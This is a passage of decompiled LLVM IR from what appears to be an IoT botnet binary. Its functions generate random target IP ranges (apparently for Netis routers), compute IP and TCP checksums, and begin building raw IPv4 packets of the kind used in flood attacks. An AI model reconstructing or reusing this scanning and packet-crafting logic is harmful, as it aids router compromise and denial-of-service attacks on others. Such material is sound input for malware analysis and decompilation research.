  %v0_804b242 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804b242 = zext i8 %v0_804b242 to i32
  store i32 %v1_804b242, i32* @edx, align 4
  %v0_804b24e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804b24e = zext i8 %v0_804b24e to i32
  %v2_804b25d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b25d, i32* @ebx, align 4
  %v5_804b264 = call i32 @szprintf(i32 %v2_804b25d, i32 ptrtoint ([13 x i8]* @global_var_80575e4.133 to i32), i32 %v1_804b24e, i32 %v1_804b242)
  br label %dec_label_pc_804b26c

dec_label_pc_804b26c:                             ; preds = %dec_label_pc_804b23c.dec_label_pc_804b26c_crit_edge, %dec_label_pc_804b242
  %v2_804b26f.pre-phi = phi i32 [ %.pre101, %dec_label_pc_804b23c.dec_label_pc_804b26c_crit_edge ], [ %v2_804b25d, %dec_label_pc_804b242 ]
  %v1_804b273 = call i32 @inet_addr(i32 %v2_804b26f.pre-phi)
  %v3_804b27b = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804b27b, i32* @ebx, align 4
  ret i32 %v1_804b273

; uselistorder directives
  uselistorder i32* %stack_var_-28, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116 }
  uselistorder i8* @global_var_806159a.41, { 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804b26c, { 1, 0 }
  uselistorder label %dec_label_pc_804b23c, { 1, 0 }
  uselistorder label %dec_label_pc_804b20c, { 1, 0 }
  uselistorder label %dec_label_pc_804b1dc, { 1, 0 }
  uselistorder label %dec_label_pc_804b1ac, { 1, 0 }
  uselistorder label %dec_label_pc_804b17c, { 1, 0 }
  uselistorder label %dec_label_pc_804b14c, { 1, 0 }
  uselistorder label %dec_label_pc_804b11c, { 1, 0 }
  uselistorder label %dec_label_pc_804b0ec, { 1, 0 }
  uselistorder label %dec_label_pc_804b0bc, { 1, 0 }
  uselistorder label %dec_label_pc_804b08c, { 1, 0 }
  uselistorder label %dec_label_pc_804b05c, { 1, 0 }
  uselistorder label %dec_label_pc_804b02c, { 1, 0 }
  uselistorder label %dec_label_pc_804affc, { 1, 0 }
  uselistorder label %dec_label_pc_804afcc, { 1, 0 }
  uselistorder label %dec_label_pc_804af9c, { 1, 0 }
  uselistorder label %dec_label_pc_804af6c, { 1, 0 }
  uselistorder label %dec_label_pc_804af3c, { 1, 0 }
  uselistorder label %dec_label_pc_804af0c, { 1, 0 }
  uselistorder label %dec_label_pc_804aedc, { 1, 0 }
  uselistorder label %dec_label_pc_804aeac, { 1, 0 }
  uselistorder label %dec_label_pc_804ae7c, { 1, 0 }
  uselistorder label %dec_label_pc_804ae4c, { 1, 0 }
  uselistorder label %dec_label_pc_804ae1c, { 1, 0 }
  uselistorder label %dec_label_pc_804adec, { 1, 0 }
  uselistorder label %dec_label_pc_804adbc, { 1, 0 }
  uselistorder label %dec_label_pc_804ad8c, { 1, 0 }
  uselistorder label %dec_label_pc_804ad5c, { 1, 0 }
  uselistorder label %dec_label_pc_804ad2c, { 1, 0 }
  uselistorder label %dec_label_pc_804acfc, { 1, 0 }
  uselistorder label %dec_label_pc_804accc, { 1, 0 }
  uselistorder label %dec_label_pc_804ac9c, { 1, 0 }
  uselistorder label %dec_label_pc_804ac6c, { 1, 0 }
  uselistorder label %dec_label_pc_804ac3c, { 1, 0 }
  uselistorder label %dec_label_pc_804ac0c, { 1, 0 }
  uselistorder label %dec_label_pc_804abdc, { 1, 0 }
  uselistorder label %dec_label_pc_804abac, { 1, 0 }
  uselistorder label %dec_label_pc_804ab7c, { 1, 0 }
  uselistorder label %dec_label_pc_804ab4c, { 1, 0 }
  uselistorder label %dec_label_pc_804ab1c, { 1, 0 }
  uselistorder label %dec_label_pc_804aaec, { 1, 0 }
  uselistorder label %dec_label_pc_804aabc, { 1, 0 }
  uselistorder label %dec_label_pc_804aa8c, { 1, 0 }
  uselistorder label %dec_label_pc_804aa5c, { 1, 0 }
  uselistorder label %dec_label_pc_804aa2c, { 1, 0 }
  uselistorder label %dec_label_pc_804a9fc, { 1, 0 }
  uselistorder label %dec_label_pc_804a9cc, { 1, 0 }
  uselistorder label %dec_label_pc_804a99c, { 1, 0 }
  uselistorder label %dec_label_pc_804a96c, { 1, 0 }
  uselistorder label %dec_label_pc_804a93c, { 1, 0 }
  uselistorder label %dec_label_pc_804a90c, { 1, 0 }
  uselistorder label %dec_label_pc_804a8dc, { 1, 0 }
  uselistorder label %dec_label_pc_804a8ac, { 1, 0 }
  uselistorder label %dec_label_pc_804a87c, { 1, 0 }
  uselistorder label %dec_label_pc_804a84c, { 1, 0 }
  uselistorder label %dec_label_pc_804a81c, { 1, 0 }
  uselistorder label %dec_label_pc_804a7ec, { 1, 0 }
  uselistorder label %dec_label_pc_804a7bc, { 1, 0 }
  uselistorder label %dec_label_pc_804a78c, { 1, 0 }
  uselistorder label %dec_label_pc_804a75c, { 1, 0 }
  uselistorder label %dec_label_pc_804a72c, { 1, 0 }
  uselistorder label %dec_label_pc_804a6fc, { 1, 0 }
  uselistorder label %dec_label_pc_804a6cc, { 1, 0 }
  uselistorder label %dec_label_pc_804a69c, { 1, 0 }
  uselistorder label %dec_label_pc_804a66c, { 1, 0 }
  uselistorder label %dec_label_pc_804a63c, { 1, 0 }
  uselistorder label %dec_label_pc_804a60c, { 1, 0 }
  uselistorder label %dec_label_pc_804a5dc, { 1, 0 }
  uselistorder label %dec_label_pc_804a5ac, { 1, 0 }
  uselistorder label %dec_label_pc_804a57c, { 1, 0 }
  uselistorder label %dec_label_pc_804a54c, { 1, 0 }
  uselistorder label %dec_label_pc_804a51c, { 1, 0 }
  uselistorder label %dec_label_pc_804a4ec, { 1, 0 }
  uselistorder label %dec_label_pc_804a4bc, { 1, 0 }
  uselistorder label %dec_label_pc_804a48c, { 1, 0 }
  uselistorder label %dec_label_pc_804a45c, { 1, 0 }
  uselistorder label %dec_label_pc_804a42c, { 1, 0 }
  uselistorder label %dec_label_pc_804a3fc, { 1, 0 }
  uselistorder label %dec_label_pc_804a3cc, { 1, 0 }
  uselistorder label %dec_label_pc_804a39c, { 1, 0 }
  uselistorder label %dec_label_pc_804a36c, { 1, 0 }
  uselistorder label %dec_label_pc_804a33c, { 1, 0 }
  uselistorder label %dec_label_pc_804a30c, { 1, 0 }
  uselistorder label %dec_label_pc_804a2dc, { 1, 0 }
  uselistorder label %dec_label_pc_804a2ac, { 1, 0 }
  uselistorder label %dec_label_pc_804a27c, { 1, 0 }
  uselistorder label %dec_label_pc_804a24c, { 1, 0 }
  uselistorder label %dec_label_pc_804a21c, { 1, 0 }
  uselistorder label %dec_label_pc_804a1ec, { 1, 0 }
  uselistorder label %dec_label_pc_804a1bc, { 1, 0 }
  uselistorder label %dec_label_pc_804a18c, { 1, 0 }
  uselistorder label %dec_label_pc_804a15c, { 1, 0 }
  uselistorder label %dec_label_pc_804a12c, { 1, 0 }
  uselistorder label %dec_label_pc_804a0fc, { 1, 0 }
  uselistorder label %dec_label_pc_804a0cc, { 1, 0 }
  uselistorder label %dec_label_pc_804a09c, { 1, 0 }
  uselistorder label %dec_label_pc_804a06c, { 1, 0 }
  uselistorder label %dec_label_pc_804a03c, { 1, 0 }
  uselistorder label %dec_label_pc_804a00c, { 1, 0 }
  uselistorder label %dec_label_pc_8049fdc, { 1, 0 }
  uselistorder label %dec_label_pc_8049fac, { 1, 0 }
  uselistorder label %dec_label_pc_8049f7c, { 1, 0 }
  uselistorder label %dec_label_pc_8049f4c, { 1, 0 }
  uselistorder label %dec_label_pc_8049f1c, { 1, 0 }
  uselistorder label %dec_label_pc_8049eec, { 1, 0 }
  uselistorder label %dec_label_pc_8049ebc, { 1, 0 }
  uselistorder label %dec_label_pc_8049e8c, { 1, 0 }
  uselistorder label %dec_label_pc_8049e5c, { 1, 0 }
  uselistorder label %dec_label_pc_8049e2c, { 1, 0 }
  uselistorder label %dec_label_pc_8049dfc, { 1, 0 }
  uselistorder label %dec_label_pc_8049dcc, { 1, 0 }
  uselistorder label %dec_label_pc_8049d9c, { 1, 0 }
  uselistorder label %dec_label_pc_8049d6c, { 1, 0 }
  uselistorder label %dec_label_pc_8049d3c, { 1, 0 }
  uselistorder label %dec_label_pc_8049d0c, { 1, 0 }
  uselistorder label %dec_label_pc_8049cdc, { 1, 0 }
}

define i32 @NetisRanges(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804b285 = load i32, i32* @ebx, align 4
  store i32 %v0_804b285, i32* %stack_var_-16, align 4
  %v1_804b289 = call i32 @random()
  %v1_804b28e = urem i32 %v1_804b289, 16
  %v1_804b297 = mul nuw nsw i32 %v1_804b28e, 4
  %v2_804b297 = add i32 %v1_804b297, ptrtoint (i32* @global_var_8061280.154 to i32)
  %v3_804b297 = inttoptr i32 %v2_804b297 to i32*
  %v4_804b297 = load i32, i32* %v3_804b297, align 4
  store i32 %v4_804b297, i32* @eax, align 4
  %v1_804b29e = trunc i32 %v4_804b297 to i8
  store i8 %v1_804b29e, i8* @global_var_8061596.155, align 2
  %v1_804b2a3 = call i32 @random()
  %v2_804b2b3 = ashr i32 %v1_804b2a3, 31
  %v2_804b2b6 = zext i32 %v1_804b2a3 to i64
  %v4_804b2b6 = zext i32 %v2_804b2b3 to i64
  %v5_804b2b6 = mul nuw i64 %v4_804b2b6, 4294967296
  %v6_804b2b6 = or i64 %v5_804b2b6, %v2_804b2b6
  %v10_804b2b6 = srem i64 %v6_804b2b6, 255
  %v11_804b2b6 = trunc i64 %v10_804b2b6 to i32
  store i32 %v11_804b2b6, i32* @eax, align 4
  %v1_804b2ba = trunc i64 %v10_804b2b6 to i8
  store i8 %v1_804b2ba, i8* @global_var_8061597.38, align 1
  %v0_804b2bf = call i32 @random()
  %v2_804b2cf = ashr i32 %v0_804b2bf, 31
  %v2_804b2d2 = zext i32 %v0_804b2bf to i64
  %v4_804b2d2 = zext i32 %v2_804b2cf to i64
  %v5_804b2d2 = mul nuw i64 %v4_804b2d2, 4294967296
  %v6_804b2d2 = or i64 %v5_804b2d2, %v2_804b2d2
  %v10_804b2d2 = srem i64 %v6_804b2d2, 255
  %v11_804b2d2 = trunc i64 %v10_804b2d2 to i32
  store i32 %v11_804b2d2, i32* @eax, align 4
  %v1_804b2d6 = trunc i64 %v10_804b2d2 to i8
  store i8 %v1_804b2d6, i8* @global_var_8061598.39, align 8
  %v0_804b2db = call i32 @random()
  %v2_804b2eb = ashr i32 %v0_804b2db, 31
  %v2_804b2ee = zext i32 %v0_804b2db to i64
  %v4_804b2ee = zext i32 %v2_804b2eb to i64
  %v5_804b2ee = mul nuw i64 %v4_804b2ee, 4294967296
  %v6_804b2ee = or i64 %v5_804b2ee, %v2_804b2ee
  %v10_804b2ee = srem i64 %v6_804b2ee, 255
  %v11_804b2ee = trunc i64 %v10_804b2ee to i32
  %v1_804b2f2 = trunc i64 %v10_804b2ee to i8
  store i8 %v1_804b2f2, i8* @global_var_8061599.40, align 1
  store i32 0, i32* %stack_var_-36, align 4
  %v1_804b313 = urem i32 %v11_804b2ee, 256
  store i32 %v1_804b313, i32* @edx, align 4
  %v0_804b32b = load i8, i8* @global_var_8061597.38, align 1
  %v1_804b32b = zext i8 %v0_804b32b to i32
  store i32 %v1_804b32b, i32* @ebx, align 4
  %v0_804b337 = load i8, i8* @global_var_8061596.155, align 2
  %v1_804b337 = zext i8 %v0_804b337 to i32
  %v2_804b346 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804b346, i32* @edi, align 4
  %v5_804b352 = call i32 @szprintf(i32 %v2_804b346, i32 ptrtoint ([12 x i8]* @global_var_80576f8.156 to i32), i32 %v1_804b337, i32 %v1_804b32b)
  %v1_804b361 = call i32 @inet_addr(i32 %v2_804b346)
  %v2_804b36c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b36c, i32* @ebx, align 4
  ret i32 %v1_804b361

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i8* @global_var_8061599.40, { 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_8061598.39, { 2, 1, 0 }
  uselistorder i8* @global_var_8061597.38, { 3, 2, 1, 0 }
  uselistorder i8* @global_var_8061596.155, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804b377 = load i32, i32* @global_var_8067808.157, align 8
  %v1_804b380 = call i32 @ntohl(i32 %v0_804b377)
  %v5_804b388 = and i32 %v1_804b380, %arg1
  %v1_804b38e = call i32 @rand_cmwc(i32 %v5_804b388)
  %v1_804b398 = sub i32 -1, %arg1
  %v2_804b39a = and i32 %v1_804b38e, %v1_804b398
  %v5_804b39c = xor i32 %v2_804b39a, %v5_804b388
  ret i32 %v5_804b39c
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804b3a6 = load i32, i32* @ebx, align 4
  %v4_804b3da33 = add i32 %arg2, -1
  %v9_804b3da34 = sub i32 0, %arg2
  %v10_804b3da35 = and i32 %arg2, %v9_804b3da34
  %v11_804b3da36 = icmp slt i32 %v10_804b3da35, 0
  %v12_804b3da37 = icmp eq i32 %v4_804b3da33, 0
  %v13_804b3da38 = icmp slt i32 %v4_804b3da33, 0
  %v3_804b3de39 = icmp eq i1 %v13_804b3da38, %v11_804b3da36
  %v4_804b3de40 = icmp eq i1 %v12_804b3da37, false
  %v5_804b3de41 = and i1 %v4_804b3de40, %v3_804b3de39
  br i1 %v5_804b3de41, label %dec_label_pc_804b3ba.lr.ph, label %dec_label_pc_804b3e0

dec_label_pc_804b3ba.lr.ph:                       ; preds = %entry
  %v4_804b3bd.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804b3ba

dec_label_pc_804b3ba:                             ; preds = %dec_label_pc_804b3ba.lr.ph, %dec_label_pc_804b3ba
  %v4_804b3bd = phi i32 [ %v4_804b3bd.pre, %dec_label_pc_804b3ba.lr.ph ], [ %v6_804b3bd, %dec_label_pc_804b3ba ]
  %stack_var_-24.045 = phi i16 [ 0, %dec_label_pc_804b3ba.lr.ph ], [ %v9_804b3cf, %dec_label_pc_804b3ba ]
  %stack_var_8.044 = phi i32 [ %arg2, %dec_label_pc_804b3ba.lr.ph ], [ %v4_804b3d6, %dec_label_pc_804b3ba ]
  %stack_var_4.043 = phi i16* [ %arg1, %dec_label_pc_804b3ba.lr.ph ], [ %v23_804b3d2, %dec_label_pc_804b3ba ]
  %v3_804b3cc42 = phi i32 [ 0, %dec_label_pc_804b3ba.lr.ph ], [ %v6_804b3cc, %dec_label_pc_804b3ba ]
  %v4_804b3ba = ptrtoint i16* %stack_var_4.043 to i32
  %v2_804b3bd = load i16, i16* %stack_var_4.043, align 2
  %v3_804b3bd = zext i16 %v2_804b3bd to i32
  %v5_804b3bd = and i32 %v4_804b3bd, -65536
  %v6_804b3bd = or i32 %v5_804b3bd, %v3_804b3bd
  store i32 %v6_804b3bd, i32* @ecx, align 4
  %sext51 = mul i32 %v3_804b3cc42, 65536
  %v4_804b3cc = sdiv i32 %sext51, 65536
  %v6_804b3cc = add nsw i32 %v3_804b3bd, %v4_804b3cc
  %v11_804b3cc = icmp ult i32 %v6_804b3cc, %v4_804b3cc
  %v26_804b3cc = trunc i32 %v6_804b3cc to i16
  %v7_804b3cf = zext i1 %v11_804b3cc to i16
  %v9_804b3cf = add i16 %v7_804b3cf, %stack_var_-24.045
  %v5_804b3d2 = add i32 %v4_804b3ba, 2
  %v23_804b3d2 = inttoptr i32 %v5_804b3d2 to i16*
  %v4_804b3d6 = add i32 %stack_var_8.044, -2
  %v4_804b3da = add i32 %stack_var_8.044, -3
  %v9_804b3da = sub i32 2, %stack_var_8.044
  %v10_804b3da = and i32 %v4_804b3d6, %v9_804b3da
  %v11_804b3da = icmp slt i32 %v10_804b3da, 0
  %v12_804b3da = icmp eq i32 %v4_804b3da, 0
  %v13_804b3da = icmp slt i32 %v4_804b3da, 0
  %v3_804b3de = icmp eq i1 %v13_804b3da, %v11_804b3da
  %v4_804b3de = icmp eq i1 %v12_804b3da, false
  %v5_804b3de = and i1 %v4_804b3de, %v3_804b3de
  br i1 %v5_804b3de, label %dec_label_pc_804b3ba, label %dec_label_pc_804b3e0

dec_label_pc_804b3e0:                             ; preds = %dec_label_pc_804b3ba, %entry
  %v3_804b3cc.lcssa = phi i16 [ 0, %entry ], [ %v26_804b3cc, %dec_label_pc_804b3ba ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_804b3d2, %dec_label_pc_804b3ba ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_804b3d6, %dec_label_pc_804b3ba ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_804b3cf, %dec_label_pc_804b3ba ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_804b424.preheader, label %dec_label_pc_804b3e6

dec_label_pc_804b3e6:                             ; preds = %dec_label_pc_804b3e0
  %v1_804b3e9 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_804b3e9 = load i8, i8* %v1_804b3e9, align 1
  %v3_804b3e9 = zext i8 %v2_804b3e9 to i32
  %v4_804b3e9 = load i32, i32* @ecx, align 4
  %v5_804b3e9 = and i32 %v4_804b3e9, -256
  %v6_804b3e9 = or i32 %v5_804b3e9, %v3_804b3e9
  store i32 %v6_804b3e9, i32* @ecx, align 4
  %v4_804b3f7 = sext i16 %v3_804b3cc.lcssa to i32
  %v6_804b3f7 = add nsw i32 %v3_804b3e9, %v4_804b3f7
  %v11_804b3f7 = icmp ult i32 %v6_804b3f7, %v4_804b3f7
  %v26_804b3f7 = trunc i32 %v6_804b3f7 to i16
  %v7_804b3fa = zext i1 %v11_804b3f7 to i16
  %v9_804b3fa = add i16 %v7_804b3fa, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804b424.preheader

dec_label_pc_804b424.preheader:                   ; preds = %dec_label_pc_804b3e6, %dec_label_pc_804b3e0
  %v3_804b409.ph = phi i16 [ %v3_804b3cc.lcssa, %dec_label_pc_804b3e0 ], [ %v26_804b3f7, %dec_label_pc_804b3e6 ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_804b3e0 ], [ %v9_804b3fa, %dec_label_pc_804b3e6 ]
  %v4_804b42420 = sext i16 %v3_804b409.ph to i32
  %v4_804b42721 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804b42a22 = udiv i32 %v4_804b42420, 65536
  %v4_804b42a23 = mul i32 %v4_804b42721, 65536
  %v5_804b42a24 = or i32 %v4_804b42a23, %v3_804b42a22
  %v2_804b42e25 = udiv i32 %v4_804b42721, 65536
  %v2_804b43126 = or i32 %v5_804b42a24, %v2_804b42e25
  %v3_804b43127 = icmp eq i32 %v2_804b43126, 0
  %v1_804b43528 = icmp eq i1 %v3_804b43127, false
  br i1 %v1_804b43528, label %dec_label_pc_804b3ff, label %dec_label_pc_804b437

dec_label_pc_804b3ff:                             ; preds = %dec_label_pc_804b424.preheader, %dec_label_pc_804b3ff
  %v2_804b42e31 = phi i32 [ %v2_804b42e, %dec_label_pc_804b3ff ], [ %v2_804b42e25, %dec_label_pc_804b424.preheader ]
  %v5_804b42a30 = phi i32 [ %v5_804b42a, %dec_label_pc_804b3ff ], [ %v5_804b42a24, %dec_label_pc_804b424.preheader ]
  %v4_804b42429 = phi i32 [ %v4_804b424, %dec_label_pc_804b3ff ], [ %v4_804b42420, %dec_label_pc_804b424.preheader ]
  %v2_804b41a = add i32 %v5_804b42a30, %v4_804b42429
  %v7_804b41a = icmp ult i32 %v2_804b41a, %v4_804b42429
  %v3_804b41c = zext i1 %v7_804b41a to i32
  %v5_804b41c = add nuw nsw i32 %v3_804b41c, %v2_804b42e31
  %sext = mul i32 %v2_804b41a, 65536
  %v4_804b424 = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_804b41c, 65536
  %v4_804b427 = sdiv i32 %sext50, 65536
  %v3_804b42a = udiv i32 %v4_804b424, 65536
  %v5_804b42a = or i32 %sext50, %v3_804b42a
  %v2_804b42e = udiv i32 %v4_804b427, 65536
  %v2_804b431 = or i32 %v5_804b42a, %v2_804b42e
  %v3_804b431 = icmp eq i32 %v2_804b431, 0
  %v1_804b435 = icmp eq i1 %v3_804b431, false
  br i1 %v1_804b435, label %dec_label_pc_804b3ff, label %dec_label_pc_804b424.dec_label_pc_804b437_crit_edge

dec_label_pc_804b424.dec_label_pc_804b437_crit_edge: ; preds = %dec_label_pc_804b3ff
  store i32 %v5_804b42a30, i32* @ecx, align 4
  br label %dec_label_pc_804b437

dec_label_pc_804b437:                             ; preds = %dec_label_pc_804b424.dec_label_pc_804b437_crit_edge, %dec_label_pc_804b424.preheader
  %v4_804b424.lcssa = phi i32 [ %v4_804b424, %dec_label_pc_804b424.dec_label_pc_804b437_crit_edge ], [ %v4_804b42420, %dec_label_pc_804b424.preheader ]
  %v1_804b43a = urem i32 %v4_804b424.lcssa, 65536
  %v1_804b43c = xor i32 %v1_804b43a, 65535
  store i32 %v0_804b3a6, i32* @ebx, align 4
  ret i32 %v1_804b43c

; uselistorder directives
  uselistorder i32 %v5_804b42a, { 1, 0 }
  uselistorder i32 %v4_804b424, { 1, 0, 2 }
  uselistorder i32 %v2_804b42e25, { 1, 0 }
  uselistorder i32 %v4_804b42721, { 1, 0 }
  uselistorder i32 %v4_804b42420, { 2, 1, 0 }
  uselistorder i32 %v4_804b3f7, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_804b3cc.lcssa, { 1, 0 }
  uselistorder i32 %v4_804b3da, { 1, 0 }
  uselistorder i32 %v6_804b3cc, { 1, 2, 0 }
  uselistorder i32 %v4_804b3cc, { 1, 0 }
  uselistorder i32 %v6_804b3bd, { 1, 0 }
  uselistorder label %dec_label_pc_804b3ff, { 1, 0 }
  uselistorder label %dec_label_pc_804b3ba, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %v1_804b45d = add i32 %tmp9, 12
  %v2_804b45d = inttoptr i32 %v1_804b45d to i32*
  %v3_804b45d = load i32, i32* %v2_804b45d, align 4
  %v1_804b466 = add i32 %tmp9, 16
  %v2_804b466 = inttoptr i32 %v1_804b466 to i32*
  %v3_804b466 = load i32, i32* %v2_804b466, align 4
  %v1_804b479 = call i32 @htons(i32 20)
  %v1_804b493 = call i32 @malloc(i32 32)
  store i32 %v1_804b493, i32* %ecx.global-to-local, align 4
  %v2_804b4a6 = inttoptr i32 %v1_804b493 to i32*
  store i32 %v3_804b45d, i32* %v2_804b4a6, align 4
  %v1_804b4ab = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b4ab = add i32 %v1_804b4ab, 4
  %v3_804b4ab = inttoptr i32 %v2_804b4ab to i32*
  store i32 %v3_804b466, i32* %v3_804b4ab, align 4
  %v1_804b4b1 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b4b1 = add i32 %v1_804b4b1, 8
  %v3_804b4b1 = inttoptr i32 %v2_804b4b1 to i32*
  store i32 0, i32* %v3_804b4b1, align 4
  store i32 %tmp1, i32* @ecx, align 4
  %v1_804b4ba = add i32 %v1_804b493, 12
  store i32 %v1_804b4ba, i32* %edx.global-to-local, align 4
  %v1_804b4bd = inttoptr i32 %tmp1 to i32*
  %v2_804b4bd = load i32, i32* %v1_804b4bd, align 4
  %v2_804b4bf = inttoptr i32 %v1_804b4ba to i32*
  store i32 %v2_804b4bd, i32* %v2_804b4bf, align 4
  %v0_804b4c1 = load i32, i32* @ecx, align 4
  %v1_804b4c1 = add i32 %v0_804b4c1, 4
  %v2_804b4c1 = inttoptr i32 %v1_804b4c1 to i32*
  %v3_804b4c1 = load i32, i32* %v2_804b4c1, align 4
  %v1_804b4c4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b4c4 = add i32 %v1_804b4c4, 4
  %v3_804b4c4 = inttoptr i32 %v2_804b4c4 to i32*
  store i32 %v3_804b4c1, i32* %v3_804b4c4, align 4
  %v0_804b4c7 = load i32, i32* @ecx, align 4
  %v1_804b4c7 = add i32 %v0_804b4c7, 8
  %v2_804b4c7 = inttoptr i32 %v1_804b4c7 to i32*
  %v3_804b4c7 = load i32, i32* %v2_804b4c7, align 4
  %v1_804b4ca = load i32, i32* %edx.global-to-local, align 4
  %v2_804b4ca = add i32 %v1_804b4ca, 8
  %v3_804b4ca = inttoptr i32 %v2_804b4ca to i32*
  store i32 %v3_804b4c7, i32* %v3_804b4ca, align 4
  %v0_804b4cd = load i32, i32* @ecx, align 4
  %v1_804b4cd = add i32 %v0_804b4cd, 12
  %v2_804b4cd = inttoptr i32 %v1_804b4cd to i32*
  %v3_804b4cd = load i32, i32* %v2_804b4cd, align 4
  %v1_804b4d0 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b4d0 = add i32 %v1_804b4d0, 12
  %v3_804b4d0 = inttoptr i32 %v2_804b4d0 to i32*
  store i32 %v3_804b4cd, i32* %v3_804b4d0, align 4
  %v0_804b4d3 = load i32, i32* @ecx, align 4
  %v1_804b4d3 = add i32 %v0_804b4d3, 16
  %v2_804b4d3 = inttoptr i32 %v1_804b4d3 to i32*
  %v3_804b4d3 = load i32, i32* %v2_804b4d3, align 4
  %v1_804b4d6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b4d6 = add i32 %v1_804b4d6, 16
  %v3_804b4d6 = inttoptr i32 %v2_804b4d6 to i32*
  store i32 %v3_804b4d3, i32* %v3_804b4d6, align 4
  %v2_804b4df = inttoptr i32 %v1_804b493 to i16*
  %v3_804b4df = call i32 @csum(i16* %v2_804b4df, i32 32)
  %v1_804b4f1 = call i32 @free(i32 %v1_804b493)
  %v4_804b4f9 = urem i32 %v3_804b4df, 65536
  ret i32 %v4_804b4f9

; uselistorder directives
  uselistorder i32 %v1_804b493, { 2, 3, 4, 1, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp1, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_804b504 = load i32, i32* @ebp, align 4
  store i32 %v0_804b504, i32* %stack_var_-4, align 4
  %v4_804b50a = sext i8 %tmp8 to i32
  %v4_804b510 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804b52d = add i32 %v4_804b510, 1
  %v2_804b52d = inttoptr i32 %v1_804b52d to i8*
  store i8 0, i8* %v2_804b52d, align 1
  %v1_804b534 = add i32 %tmp5, 20
  %v1_804b53a = trunc i32 %v1_804b534 to i16
  %v3_804b53a = add i32 %v4_804b510, 2
  %v4_804b53a = inttoptr i32 %v3_804b53a to i16*
  store i16 %v1_804b53a, i16* %v4_804b53a, align 2
  %v2_804b53e = call i32 @rand_cmwc(i32 %v4_804b50a)
  %v1_804b548 = trunc i32 %v2_804b53e to i16
  %v3_804b548 = add i32 %v4_804b510, 4
  %v4_804b548 = inttoptr i32 %v3_804b548 to i16*
  store i16 %v1_804b548, i16* %v4_804b548, align 2
  %v1_804b54f = add i32 %v4_804b510, 6
